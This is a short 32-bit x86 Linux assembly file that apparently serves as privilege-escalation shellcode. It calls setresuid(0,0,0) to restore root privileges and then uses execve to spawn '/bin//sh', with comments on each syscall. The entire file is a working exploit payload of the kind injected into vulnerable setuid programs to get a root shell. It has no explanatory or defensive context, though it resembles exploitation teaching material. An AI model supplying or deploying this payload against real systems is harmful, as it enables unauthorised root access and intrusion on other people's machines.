BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax,eax
  xor ebx,ebx
  xor ecx,ecx
  xor edx,edx
  mov al, 0xa4    ; syscall number 164
  int 0x80        ; call setresuid(0,0,0)

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax,eax
  mov al, 11      ; syscall 11
  push ecx
  push 0x68732f2f ; push "//sh" to the stack
  push 0x6e69622f ; push "/bin" to the stack
  mov ebx, esp
  push ecx
  mov edx, esp
  push ebx
  mov ecx, esp
  int 0x80 
